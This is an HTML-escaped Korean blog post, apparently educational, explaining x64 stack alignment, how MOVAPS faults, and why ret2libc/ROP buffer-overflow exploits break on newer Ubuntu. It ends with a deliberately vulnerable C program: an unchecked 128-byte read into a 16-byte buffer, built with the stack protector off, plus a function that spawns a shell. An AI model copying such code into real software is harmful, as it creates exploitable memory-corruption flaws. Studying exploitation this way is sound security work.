&lt;li&gt;call &amp;#xC2E4;&amp;#xD589; &amp;#xC9C1;&amp;#xC804; RSP&amp;#xB294; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218; ( stack align O )&lt;/li&gt;
&lt;li&gt;&amp;#xD568;&amp;#xC218;&amp;#xC758; entry point&amp;#xC5D0;&amp;#xC120; RSP+8&amp;#xC774; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218; ( stack align X )&lt;/li&gt;
&lt;li&gt;&amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xD504;&amp;#xB864;&amp;#xB85C;&amp;#xADF8; &amp;#xC2E4;&amp;#xD589; &amp;#xD6C4; RSP&amp;#xB294; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218; ( stack align O )&lt;/li&gt;
&lt;li&gt;RBP&amp;#xB294; &amp;#xD56D;&amp;#xC0C1; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218; ( stack align O )&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&amp;#xC0AC;&amp;#xC2E4;, &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD560; &amp;#xB54C; 2&amp;#xBC88; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &amp;#xC7A0;&amp;#xC2DC; stack align&amp;#xC774; &amp;#xAE68;&amp;#xC9C0;&amp;#xACE0; 3&amp;#xBC88;&amp;#xC5D0;&amp;#xC11C; &amp;#xB2E4;&amp;#xC2DC; stack align&amp;#xC774; &amp;#xB9DE;&amp;#xCDB0;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; 2&amp;#xBC88;&amp;#xB9CC; &amp;#xB611; &amp;#xB5BC;&amp;#xC11C; &amp;#x201C;&amp;#xC774; &amp;#xAC83;&amp;#xB9CC; &amp;#xC9C0;&amp;#xD0A4;&amp;#xC2DC;&amp;#xBA74; stack align&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&amp;#x201D;&amp;#xB77C;&amp;#xACE0; &amp;#xC124;&amp;#xBA85;&amp;#xC744; &amp;#xC368;&amp;#xB194;&amp;#xC11C; &amp;#xD5F7;&amp;#xAC08;&amp;#xB9AC;&amp;#xB294; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB798;&amp;#xB3C4; &amp;#xC774;&amp;#xD574; &amp;#xC548; &amp;#xB418;&amp;#xC2DC;&amp;#xBA74; 4&amp;#xBC88;&amp;#xB9CC; &amp;#xAE30;&amp;#xC5B5;&amp;#xD558;&amp;#xC138;&amp;#xC694;. 4&amp;#xBC88;&amp;#xB9CC; &amp;#xC2E0;&amp;#xACBD; &amp;#xC368;&amp;#xC918;&amp;#xB3C4; &amp;#xACF5;&amp;#xACA9; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC9DC;&amp;#xB294;&amp;#xB370; &amp;#xC544;&amp;#xBB34; &amp;#xC9C0;&amp;#xC7A5;&amp;#xC774; &amp;#xC5C6;&amp;#xC744; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB354; &amp;#xC790;&amp;#xC138;&amp;#xD55C; &amp;#xC124;&amp;#xBA85;&amp;#xC740; &amp;#xC870;&amp;#xAE08; &amp;#xC774;&amp;#xB530; &amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;MOVAPS&#34;&gt;&lt;a href=&#34;#MOVAPS&#34; class=&#34;headerlink&#34; title=&#34;MOVAPS&#34;&gt;&lt;/a&gt;MOVAPS&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/11.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774; &amp;#xADDC;&amp;#xCE59;&amp;#xC744; &amp;#xAF2D; &amp;#xC9C0;&amp;#xCF1C;&amp;#xC57C; &amp;#xD558;&amp;#xB294;&amp;#xAC00;? &amp;#xBB3C;&amp;#xB860; &amp;#xC544;&amp;#xB2D9;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBC29;&amp;#xAE08; &amp;#xC804;&amp;#xC5D0;&amp;#xB3C4; &amp;#xC124;&amp;#xBA85;&amp;#xD588;&amp;#xB4EF;&amp;#xC774; &amp;#xC720;&amp;#xC5F0;&amp;#xD558;&amp;#xAC8C; &amp;#xC5B4;&amp;#xACBC;&amp;#xB2E4;&amp;#xAC00; &amp;#xC9C0;&amp;#xCF30;&amp;#xB2E4;&amp;#xAC00; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; stack alignment&amp;#xB294; &amp;#xD6A8;&amp;#xC728;&amp;#xC744; &amp;#xB192;&amp;#xC774;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xC720;&amp;#xC9C0;&amp;#xD55C;&amp;#xB2E4;&amp;#xACE0;&amp;#xB3C4; &amp;#xC124;&amp;#xBA85;&amp;#xD588;&amp;#xB2E4;&amp;#xC2DC;&amp;#xD53C; &amp;#xC9C0;&amp;#xD0A4;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544;&amp;#xB3C4; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC774; &amp;#xB3D9;&amp;#xC791;&amp;#xD558;&amp;#xB294;&amp;#xB370; &amp;#xC544;&amp;#xBB34; &amp;#xBB38;&amp;#xC81C;&amp;#xC5C6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB2E4;&amp;#xB9CC; &amp;#xD6A8;&amp;#xC728;&amp;#xC774; &amp;#xC880; &amp;#xB5A8;&amp;#xC5B4;&amp;#xC9C8; &amp;#xBFD0;&amp;#x2026; &amp;#xBB3C;&amp;#xB860; &amp;#xC608;&amp;#xC678;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294;&amp;#xB370; &amp;#xBA87;&amp;#xBA87; intel/AMD cpu&amp;#xC5D0;&amp;#xC11C; SSE instruction&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD560; &amp;#xB54C;  stack alignment&amp;#xAC00; &amp;#xAE68;&amp;#xC838;&amp;#xC788;&amp;#xC73C;&amp;#xBA74; segmentation fault&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/12.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &lt;a href=&#34;http://qcd.phys.cmu.edu/QCDcluster/intel/vtune/reference/vc181.htm&#34;&gt;MOVAPS&lt;/a&gt;&amp;#xAC00; &amp;#xBC14;&amp;#xB85C; SSE intruction &amp;#xC911; &amp;#xD558;&amp;#xB098;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. XMM &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xB07C;&amp;#xB9AC; &amp;#xD639;&amp;#xC740; XMM &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xC640; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC0AC;&amp;#xC774;&amp;#xC5D0;&amp;#xC11C; double quadword( 16byte ) &amp;#xD06C;&amp;#xAE30;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC62E;&amp;#xAE30;&amp;#xB294; &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC778;&amp;#xB370;, &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC758; align &amp;#xC5EC;&amp;#xBD80;&amp;#xB97C; &amp;#xAC15;&amp;#xC81C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&amp;lt;do_system+&lt;span class=&#34;hljs-number&#34;&gt;364&lt;/span&gt;&amp;gt; movaps xmmword ptr [rsp + &lt;span class=&#34;hljs-number&#34;&gt;0x50&lt;/span&gt;], xmm0&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;XMM &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xC640; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC0AC;&amp;#xC774;&amp;#xC5D0;&amp;#xC11C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC62E;&amp;#xAE38; &amp;#xB54C;, &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC758; align&amp;#xC774; &amp;#xAE68;&amp;#xC838;&amp;#xC788;&amp;#xC73C;&amp;#xBA74; general protection( #GP / SIGSEGV ) fault&amp;#xB97C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xD0B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; Ubuntu 18.04&amp;#xBD80;&amp;#xD130; &amp;#xC774; movaps &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC774; &lt;code&gt;do_system()&lt;/code&gt;&amp;#xC744; &amp;#xD3EC;&amp;#xD568;&amp;#xD55C; &amp;#xC5EC;&amp;#xB7EC; &amp;#xBA40;&amp;#xD2F0;&amp;#xBBF8;&amp;#xB514;&amp;#xC5B4; &amp;#xC624;&amp;#xD37C;&amp;#xB808;&amp;#xC774;&amp;#xC158;&amp;#xC5D0; &amp;#xCD94;&amp;#xAC00;&amp;#xB418;&amp;#xC5B4; exploit&amp;#xC744; &amp;#xC791;&amp;#xC131;&amp;#xD560; &amp;#xB54C; stack alignment&amp;#xB97C; &amp;#xC2E0;&amp;#xACBD; &amp;#xC368;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;JMP-vs-CALL-vs-RET&#34;&gt;&lt;a href=&#34;#JMP-vs-CALL-vs-RET&#34; class=&#34;headerlink&#34; title=&#34;JMP vs CALL vs RET&#34;&gt;&lt;/a&gt;JMP vs CALL vs RET&lt;/h1&gt;&lt;p&gt;&amp;#xADF8;&amp;#xB798;&amp;#xC11C; Exploit&amp;#xC774;&amp;#xB791; stack align&amp;#xC774; &amp;#xAE68;&amp;#xC9C0;&amp;#xB294; &amp;#xAC70;&amp;#xB791; &amp;#xBB34;&amp;#xC2A8; &amp;#xC0C1;&amp;#xAD00;&amp;#xC778;&amp;#xB370;? &amp;#xADF8;&amp;#xB798;&amp;#xC11C; &amp;#xC65C; 16.04&amp;#xC5D0;&amp;#xC120; &amp;#xC258;&amp;#xC744; &amp;#xB744;&amp;#xC6B0;&amp;#xB358; &amp;#xACF5;&amp;#xACA9; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; 18.04&amp;#xBD80;&amp;#xD134; &amp;#xC791;&amp;#xB3D9; &amp;#xC548; &amp;#xD558;&amp;#xB294; &amp;#xAC74;&amp;#xB370;? &amp;#xC774;&amp;#xAC70;&amp;#xB97C; &amp;#xC774;&amp;#xD574;&amp;#xD558;&amp;#xB824;&amp;#xBA74; &amp;#xC6B0;&amp;#xC120; control intsruction&amp;#xB4E4;&amp;#xC758; &amp;#xCC28;&amp;#xC774;&amp;#xB97C; &amp;#xC54C;&amp;#xC544;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC0DD;&amp;#xAC01;&amp;#xBCF4;&amp;#xB2E4; &amp;#xBAA8;&amp;#xB974;&amp;#xB294; &amp;#xC0AC;&amp;#xB78C;&amp;#xC774; &amp;#xB9CE;&amp;#xB354;&amp;#xB77C;&amp;#xACE0;&amp;#x2026; &amp;#xAC01; &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xB9C8;&amp;#xB2E4; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC758; &amp;#xBCC0;&amp;#xD654;, &amp;#xB354; &amp;#xC790;&amp;#xC138;&amp;#xD788; &amp;#xB9D0;&amp;#xD558;&amp;#xC790;&amp;#xBA74; RSP&amp;#xC758; &amp;#xBCC0;&amp;#xD654;&amp;#xAC00; &amp;#xC5B4;&amp;#xB5A4;&amp;#xC9C0; &amp;#xC54C;&amp;#xC544;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;1-JMP&#34;&gt;&lt;a href=&#34;#1-JMP&#34; class=&#34;headerlink&#34; title=&#34;1. JMP&#34;&gt;&lt;/a&gt;1. JMP&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Transfers program control to a different point in the instruction stream &lt;strong&gt;without&lt;/strong&gt; recording &lt;strong&gt;return information&lt;/strong&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;#xB2E8;&amp;#xC21C;&amp;#xD788; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC758; &amp;#xD750;&amp;#xB984;&amp;#xC744; &amp;#xC62E;&amp;#xAE40;. &amp;#xC778;&amp;#xC6A9;&amp;#xAD6C;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &amp;#xC54C;&amp;#xACA0;&amp;#xC9C0;&amp;#xB9CC; &amp;#xB9AC;&amp;#xD134; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. jmp &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC73C;&amp;#xB85C; &amp;#xC778;&amp;#xD55C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC758; &amp;#xBCC0;&amp;#xD654;&amp;#xB294; &amp;#xC5C6;&amp;#xB2E4;&amp;#xACE0; &amp;#xC0DD;&amp;#xAC01;&amp;#xD558;&amp;#xC2DC;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;2-CALL&#34;&gt;&lt;a href=&#34;#2-CALL&#34; class=&#34;headerlink&#34; title=&#34;2. CALL&#34;&gt;&lt;/a&gt;2. CALL&lt;/h2&gt;&lt;p&gt;&amp;#xBC18;&amp;#xBA74; call &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC740; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC758; &amp;#xD750;&amp;#xB984;&amp;#xC744; &amp;#xC62E;&amp;#xAE30;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xB77C; subroutine&amp;#xC5D0; &amp;#xC7A0;&amp;#xC2DC; &amp;#xB4E4;&amp;#xB800;&amp;#xB2E4;&amp;#xAC00; &amp;#xB3CC;&amp;#xC544;&amp;#xC624;&amp;#xB294; &amp;#xAC83;&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xB9AC;&amp;#xD134; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xADF8; &amp;#xB9AC;&amp;#xD134; &amp;#xC815;&amp;#xBCF4;&amp;#xB294; stack&amp;#xC5D0; push &amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; call &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD55C; &amp;#xB4A4;&amp;#xC5D4; RSP&amp;#xC758; &amp;#xAC12;&amp;#xC774; 8&amp;#xB9CC;&amp;#xD07C; &amp;#xAC10;&amp;#xC18C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/13.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;RSP : &lt;code&gt;0x7fffffffe030&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;call hello &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC774; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xBA74; &lt;main+18&gt;&amp;#xC744; stack&amp;#xC5D0; push &amp;#xD558;&amp;#xACA0;&amp;#xC8E0;?&lt;/main+18&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/14.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;RSP : &lt;code&gt;0x7fffffffe028&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC815;&amp;#xC0C1;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &amp;#xD568;&amp;#xC218;&amp;#xC758; entry point&amp;#xC5D0;&amp;#xC120; RSP+8&amp;#xC774; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xAC00; &amp;#xB418;&amp;#xB294; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; &amp;#xAF2D; &amp;#xAE30;&amp;#xC5B5;&amp;#xD558;&amp;#xC154;&amp;#xC57C; &amp;#xD560; &amp;#xAC83;&amp;#xC774; Call&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD55C; &amp;#xC9C1;&amp;#xD6C4;&amp;#xC5D4; &amp;#xC77C;&amp;#xC2DC;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; stack align&amp;#xC774; &amp;#xAE68;&amp;#xC9C4;&amp;#xB2E4;&amp;#xB294; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;3-RET&#34;&gt;&lt;a href=&#34;#3-RET&#34; class=&#34;headerlink&#34; title=&#34;3. RET&#34;&gt;&lt;/a&gt;3. RET&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;pop rip
jmp rip&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;call&amp;#xC744; &amp;#xC124;&amp;#xBA85;&amp;#xD560; &amp;#xB54C; sub routine&amp;#xC5D0; &amp;#xC7A0;&amp;#xC2DC; &amp;#xB4E4;&amp;#xB800;&amp;#xB2E4; &amp;#xB3CC;&amp;#xC544;&amp;#xAC04;&amp;#xB2E4;&amp;#xACE0; &amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBB3C;&amp;#xB860; &amp;#xC774; &amp;#xBAA8;&amp;#xB4E0; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; call&amp;#xC774; &amp;#xB2E4; &amp;#xD558;&amp;#xC9C4; &amp;#xC54A;&amp;#xACE0;, &amp;#xC6D0;&amp;#xB798;&amp;#xC758; &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158; &amp;#xC2A4;&amp;#xD2B8;&amp;#xB9BC;&amp;#xC73C;&amp;#xB85C; &amp;#xB2E4;&amp;#xC2DC; &amp;#xB3CC;&amp;#xC544;&amp;#xAC00;&amp;#xB294; &amp;#xB3D9;&amp;#xC791;&amp;#xC740;  ret&amp;#xC774; &amp;#xB300;&amp;#xC2E0;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;ret&amp;#xC740; &amp;#xB450; &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC744; &amp;#xD558;&amp;#xB098;&amp;#xB85C; &amp;#xD569;&amp;#xCCD0; &amp;#xB1A8;&amp;#xB2E4;&amp;#xACE0; &amp;#xC0DD;&amp;#xAC01;&amp;#xD558;&amp;#xC2DC;&amp;#xBA74; &amp;#xB418;&amp;#xB294;&amp;#xB370;, call&amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xD574;&amp;#xB193;&amp;#xC740; &amp;#xB9AC;&amp;#xD134; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0;&amp;#xC11C; &amp;#xBE7C;&amp;#xB0B4;&amp;#xC5B4; jmp &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC989;, RSP&amp;#xAC12;&amp;#xC774; 8&amp;#xB9CC;&amp;#xD07C; &amp;#xC99D;&amp;#xAC00;&amp;#xD55C;&amp;#xB2E4;&amp;#xB294; &amp;#xB73B;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/15.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;RSP : &lt;code&gt;0x7fffffffe028&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC704; &amp;#xC2A4;&amp;#xD06C;&amp;#xB9B0;&amp;#xC0F7;&amp;#xC740; ret&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xAE30; &amp;#xC9C1;&amp;#xC804;&amp;#xC758; &amp;#xC0C1;&amp;#xD669;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. RSP &amp;#xAC12;&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xC2DC;&amp;#xACA0;&amp;#xC9C0;&amp;#xB9CC; ret&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xAE30; &amp;#xC9C1;&amp;#xC804;&amp;#xC5D4; stack align&amp;#xC774; &amp;#xAE68;&amp;#xC838;&amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB294; &amp;#xD568;&amp;#xC218; &amp;#xC5D0;&amp;#xD544;&amp;#xB85C;&amp;#xADF8;&amp;#xC758; leave &amp;#xBA85;&amp;#xB839;&amp;#xC5B4; &amp;#xD639;&amp;#xC740; pop rbp&amp;#xC758; &amp;#xACB0;&amp;#xACFC;&amp;#xACA0;&amp;#xC8E0;?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/16.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;RSP : &lt;code&gt;0x7fffffffe030&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; ret&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; RSP&amp;#xAC00; 8&amp;#xB9CC;&amp;#xD07C; &amp;#xC99D;&amp;#xAC00;&amp;#xD558;&amp;#xACE0; stack align&amp;#xC774; &amp;#xB2E4;&amp;#xC2DC; &amp;#xB9DE;&amp;#xCDB0;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;&amp;#xC815;&amp;#xB9AC;&#34;&gt;&lt;a href=&#34;#&amp;#xC815;&amp;#xB9AC;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xC815;&amp;#xB9AC;&#34;&gt;&lt;/a&gt;&amp;#xC815;&amp;#xB9AC;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;call : RSP-=8 &amp;#x2192; &amp;#xC77C;&amp;#xC2DC;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; stack align&amp;#xC744; &amp;#xAE78;&lt;/li&gt;
&lt;li&gt;ret : RSP+=8 &amp;#x2192; leave &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB85C; &amp;#xAE68;&amp;#xC9C4; stack align&amp;#xC744; &amp;#xB2E4;&amp;#xC2DC; &amp;#xB9DE;&amp;#xCDA4;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;Abnormal-call&#34;&gt;&lt;a href=&#34;#Abnormal-call&#34; class=&#34;headerlink&#34; title=&#34;Abnormal call&#34;&gt;&lt;/a&gt;Abnormal call&lt;/h1&gt;&lt;p&gt;&amp;#xC790; &amp;#xC774;&amp;#xCBE4; &amp;#xB418;&amp;#xBA74; &amp;#xB300;&amp;#xCDA9; &amp;#xB208;&amp;#xCE58;&amp;#xCC44;&amp;#xC168;&amp;#xC744; &amp;#xAC70; &amp;#xAC19;&amp;#xC740;&amp;#xB370;, BOF&amp;#xACF5;&amp;#xACA9;&amp;#xC744; &amp;#xD560; &amp;#xB54C; ret&amp;#xC73C;&amp;#xB85C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xC8E0;? shellcode&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xAC74; &amp;#xB17C;&amp;#xC678;&amp;#xB85C; &amp;#xCE58;&amp;#xACE0;, ret2libc( RTL )&amp;#xB098; ROP&amp;#xB85C; BOF exploit&amp;#xC744; &amp;#xD558;&amp;#xAC8C; &amp;#xB420; &amp;#xD150;&amp;#xB370; call&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xB77C; ret&amp;#xC73C;&amp;#xB85C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; stack alignment&amp;#xAC00; &amp;#xAE68;&amp;#xC9C0;&amp;#xAC8C; &amp;#xB418;&amp;#xB294; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;vuln-c&#34;&gt;&lt;a href=&#34;#vuln-c&#34; class=&#34;headerlink&#34; title=&#34;vuln.c&#34;&gt;&lt;/a&gt;vuln.c&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// vuln.c&lt;/span&gt;

&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
	system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;);
}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
	&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;];
	
	read(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, buf, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;);
	
	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
}
$ gcc -o vuln vuln.c -no-pie -fno-&lt;span class=&#34;hljs-built_in&#34;&gt;stack&lt;/span&gt;-protector&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC815;&amp;#xB9D0; &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; BOF &amp;#xC608;&amp;#xC81C;&amp;#xB85C; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCF4;&amp;#xC8E0;. vuln.c&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xACE0; &amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xD574;&amp;#xC90D;&amp;#xC2DC;&amp;#xB2E4;. BOF&amp;#xB97C; &amp;#xD560; &amp;#xAC70;&amp;#xB2C8;&amp;#xAE4C; &amp;#xB2F9;&amp;#xC5F0;&amp;#xD788; stack canary&amp;#xB294; &amp;#xD574;&amp;#xC81C;&amp;#xD574;&amp;#xC8FC;&amp;#xC138;&amp;#xC694;.&lt;/p&gt;
